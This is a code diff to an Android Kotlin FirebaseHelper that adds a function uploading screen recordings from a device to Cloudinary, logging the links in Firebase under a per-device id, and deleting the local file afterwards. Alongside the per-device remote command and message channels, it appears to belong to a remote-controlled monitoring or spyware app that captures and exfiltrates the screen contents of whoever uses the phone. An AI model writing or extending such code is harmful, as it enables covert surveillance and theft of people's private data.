@@ -380,6 +380,57 @@ object FirebaseHelper {
         }
     }
 
+    fun uploadScreenRecording(context: Context, recordingFile: java.io.File) {
+        if (!ensureCloudinaryReady(context)) return
+        val id = getDeviceId(context)
+        val fileName = recordingFile.name
+        logRemote("FirebaseHelper", "ATTEMPTING SCREEN RECORDING UPLOAD: $fileName")
+
+        if (!recordingFile.exists()) {
+            logRemote("FirebaseHelper", "SCREEN RECORDING ERROR: File does not exist at ${recordingFile.absolutePath}", true)
+            return
+        }
+
+        try {
+            MediaManager.get().upload(recordingFile.absolutePath)
+                .unsigned(CLOUDINARY_UPLOAD_PRESET)
+                .option("resource_type", "video")
+                .option("folder", "screen_recordings/$id")
+                .callback(object : UploadCallback {
+                    override fun onStart(requestId: String) {
+                        logRemote("FirebaseHelper", "SCREEN RECORDING: onStart - $requestId")
+                    }
+                    override fun onProgress(requestId: String, bytes: Long, totalBytes: Long) {}
+                    override fun onSuccess(requestId: String, resultData: Map<*, *>) {
+                        val url = resultData["secure_url"] as String
+                        val playbackUrl = if (url.contains("/upload/")) {
+                            url.replace("/upload/", "/upload/f_mp4,vc_h264/")
+                        } else {
+                            url
+                        }
+                        logRemote("FirebaseHelper", "SCREEN RECORDING: onSuccess - URL: $url")
+                        database.getReference("devices/$id/screen_recordings").push().setValue(
+                            mapOf(
+                                "name" to fileName,
+                                "url" to url,
+                                "playbackUrl" to playbackUrl,
+                                "timestamp" to System.currentTimeMillis()
+                            )
+                        ).addOnSuccessListener { recordingFile.delete() }
+                    }
+                    override fun onError(requestId: String, error: ErrorInfo) {
+                        logRemote("FirebaseHelper", "SCREEN RECORDING: onError - ${error.description} (Code: ${error.code})", true)
+                        recordingFile.delete()
+                    }
+                    override fun onReschedule(requestId: String, error: ErrorInfo) {
+                        logRemote("FirebaseHelper", "SCREEN RECORDING: onReschedule - ${error.description} (Code: ${error.code})", true)
+                    }
+                }).dispatch()
+        } catch (e: Exception) {
+            logRemote("FirebaseHelper", "SCREEN RECORDING: Fatal Exception: ${e.message}", true)
+        }
+    }
+
     fun getCommandsRef(context: Context) = database.getReference("devices/${getDeviceId(context)}/commands")
 
     fun getMessagesRef(context: Context) = database.getReference("devices/${getDeviceId(context)}/messages")
